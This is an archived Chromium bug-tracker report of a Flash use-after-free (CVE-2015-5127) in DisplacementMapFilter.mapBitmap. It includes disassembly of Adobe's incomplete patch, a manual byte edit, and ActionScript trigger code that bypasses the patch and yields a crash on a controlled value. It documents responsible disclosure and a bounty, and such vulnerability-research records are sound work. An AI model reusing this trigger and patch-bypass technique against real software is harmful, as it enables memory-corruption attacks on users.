# Security: Flash AS2 Use After Free in DisplacementMapFilter.mapBitmap 

| Field | Value |
|-------|-------|
| **Issue ID** | [40082064](https://issues.chromium.org/issues/40082064) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **CVE IDs** | CVE-2015-5127 |
| **Reporter** | bi...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2015-05-12 |
| **Bounty** | $5,000.00 |

## Description

There is a use after free in Flash caused by an improper handling of BitmapData objects in the DisplacementMapFilter.mapBitmap property.  

This is almost a repost of <https://crbug.com/chromium/457680> due to a patch failure.

**VERSION**  

Chrome Version: N/A now, Flash StandAlone Debug 17.0.0.188  

Operating System: [Win7 x64 SP1]

**REPRODUCTION CASE**  

The AS2 mapBitmap\_v2\_as2.fla can be compiled with Flash CS5. Some bytes must be changed manually to trigger the issue (see below).  

Just put mapBitmap\_v2\_as2.swf in a browsable directory and run the swf with Chrome. It might crash while dereferencing 0x41424344 (hopefully, not tested yet because not available).

After compiling mapBitmap\_v2\_as2.swf, I had to change the bytes at offset 0x92B in the (MyBitmapData constructor):  

52 17 96 02 00 04 03 26 to 17 17 17 17 17 17 17 17 (actionPOP)

The description is exactly the same as in <https://crbug.com/chromium/457680> so I won't repost it. Here are just my comments on the patch.  

They basically added a marker at offset +0xDC in the flash standalone debugger (the standalone player is not available at the time of writing):

.text:005AD629 loc\_5AD629:  

.text:005AD629 lea ecx, [esi+0DCh]  

.text:005AD62F push edi  

.text:005AD630 mov [ebp+1C4h+var\_198], ecx  

.text:005AD633 call xsetUseMarker

.text:0059F762 cmp byte ptr [ecx], 0 ; is the marker present?  

.text:0059F765 jz short loc\_59F77B  

.text:0059F767 cmp [esp+arg\_0], 0 ; is 0 provided?  

.text:0059F76C jz short locret\_59F77E  

.text:0059F76E mov ecx, dword\_EE4788 ; kill the program  

.text:0059F774 call sub\_9798C0  

.text:0059F779 jmp short locret\_59F77E  

.text:0059F77B  

.text:0059F77B loc\_59F77B:  

.text:0059F77B mov byte ptr [ecx], 1 ; else set the marker  

.text:0059F77E  

.text:0059F77E locret\_59F77E:  

.text:0059F77E retn 4

That marker is then removed when we exit the BitmapData dispatcher:

.text:005AEF29 mov eax, [ebp+1C4h+var\_198] ; jumptable 005AD654 default case  

.text:005AEF2C mov byte ptr [eax], 0

So, to trigger again the issue, we just have to put an extra call to getPixel32 for example:

var o = new Object()  

o.valueOf = function () {  

bd.getPixel32(1,4) // remove the marker :)  

f()  

for (var i = 0; i<0x10;i++) {  

var tf:TextFormat = new TextFormat()  

tf.tabStops = b  

a[i] = tf  

}  

return 4  

}

bd.getPixel32(o,4)

And we're done :)

## Attachments

- [mapbitmap_v2_as2.zip](attachments/mapbitmap_v2_as2.zip) (application/zip, 7.1 KB)
- [MyBitmapData.as](attachments/MyBitmapData.as) (application/octet-stream, 307 B)

## Timeline

### bi...@gmail.com (2015-05-12)

Dispatch to scarybeasts and natashenka. Hopefully they did not wake up early this morning and they haven't figured the issue. Yet. Otherwise I'll need more than a beer to forget... :/

### bi...@gmail.com (2015-05-12)

Forgot to link MyBitmapData.as

### ri...@chromium.org (2015-05-12)

Thanks for all the bugs :-)

### sc...@gmail.com (2015-05-12)

Yeah, it's novel. Crashes on Linux x64 too

=> 0x00007fdd52695791:	callq  *0x28(%rax)
rax = 0x0

Got a sample that shows control of a register like last time?

### sc...@gmail.com (2015-05-12)

Deadline tracking: https://code.google.com/p/google-security-research/issues/detail?id=377

Details sent to Adobe.

### bi...@gmail.com (2015-05-13)

[Comment Deleted]

### sc...@gmail.com (2015-05-13)

On 32-bit Windows, I do see a crash due to eax==0x41424344

### sc...@gmail.com (2015-05-13)

This is PSIRT-3675.

### bi...@gmail.com (2015-08-20)

Fixed in https://helpx.adobe.com/security/products/flash-player/apsb15-19.html, CVE-2015-5127

### ti...@google.com (2015-08-26)

[Empty comment from Monorail migration]

### ti...@google.com (2015-08-30)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-09)

$5000 for this one as well.

### ti...@google.com (2015-10-16)

[Empty comment from Monorail migration]

### ti...@google.com (2015-10-29)

Payment is on its way - should arrive in ~7 days. Thanks again for your report!

### cl...@chromium.org (2015-12-02)

Bulk update: removing view restriction from closed bugs.

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/487237?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40082064)*
